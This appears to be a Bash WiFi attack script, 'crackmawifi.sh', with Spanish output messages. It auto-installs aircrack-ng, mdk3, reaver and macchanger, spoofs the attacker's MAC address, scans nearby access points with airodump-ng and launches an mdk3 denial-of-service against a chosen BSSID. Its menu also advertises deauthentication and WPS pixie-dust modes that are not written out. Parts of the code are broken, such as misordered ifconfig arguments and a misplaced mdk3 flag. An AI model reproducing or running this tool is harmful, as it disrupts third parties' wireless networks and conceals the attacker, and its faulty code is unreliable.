#!/usr/bin/env bash  

# Author : IRVING ST (AK) COMANDRE-EX

export  DEBIAN_FRONTEND=noninteractive

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${redColour}[!] Saliendo...\n${endColour}"
	tput cnorm; airmon-ng  stop ${interface}mon
	rm  Captura* > /dev/null 2>&1
	tput cnorm; exit 1
}


function dependencies(){
	tput civis
	clear; dependencies=(aircrack-ng macchanger reaver  wash mdk3 xterm)


	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

		test -f /usr/bin/$program

		if [ "$(echo $?)" == "0" ]; then
			echo -e " ${greenColour}(V)${endColour}"
		else
			echo -e " ${redColour}(X)${endColour}\n"
			echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
			apt-get install $program -y > /dev/null 2>&1
		fi; sleep 1
	done
}



function helpPanel(){
	echo -e "\n${redColour}[!] Uso: ./crackmawifi.sh  -i  <network  interface>${endColour}"
	echo -e "\n\n\t${grayColour}[-i]${endColour}${yellowColour} Network Interface${endColour}\t ${grayColour}[-a]${endColour}${yellowColour} Attack Mode"
	echo -e "\t\t${purpleColour}${grayColour}1${endColour}${yellowColour})${endColour} Deautentication Broadcast${endColour}${purpleColour} ${grayColour}3${endColour}${yellowColour})${endColour} Deautentication Dirijido${endColour} "
	echo -e "\t\t${purpleColour}${grayColour}2${endColour}${yellowColour})${endColour} DoS Service${endColour}${purpleColour}\t ${grayColour}4${endColour}${yellowColour})${endColour} WPS pixie dust  ${endColour}"
	tput cnorm; exit 1
}



function attack_mode(){


	echo -e "${yellowColour}[*]${endColour}${grayColour} Cambiando direccion  MAC de la  interfaz  ${interface} ${endColour}"
	
	ifconfig down  ${interface} && macchanger  -a ${interface} > /dev/null 2>&1
	ifconfig up ${interface} && killall  dhclient wpa_supplicant 2>/dev/null
	
	echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${interface} | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

	if [[ "$(echo  $attack_mode)" == "DoS" ]]; then 

		xterm -hold -e "airodump-ng ${interface}mon" &
		airodump_ng_PID=$!
		
		
		
		echo -e "${yellowColour}[*]${endColour}${grayColour} BSSID del (AP)   ${endColour}" &&  read apBssid
		kill -9 $airodump_ng_PID 
		wait $airodump_ng_PID 2>/dev/null
		
		echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando  Denegacion  de servicio   ${interface} ${endColour}"
		
		sleep 3
		xterm -hold  -e "mdk3 ${interface}mon" -a $apBssid
	fi  
}





# Main Function

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":i:a:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			i) interface=$OPTARG; let parameter_counter+=1 ;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 2 ]; then
		helpPanel
	else
		dependencies
		attack_mode
		tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	fi
else
	echo -e "\n${redColour}[*] No soy root${endColour}\n"
fi
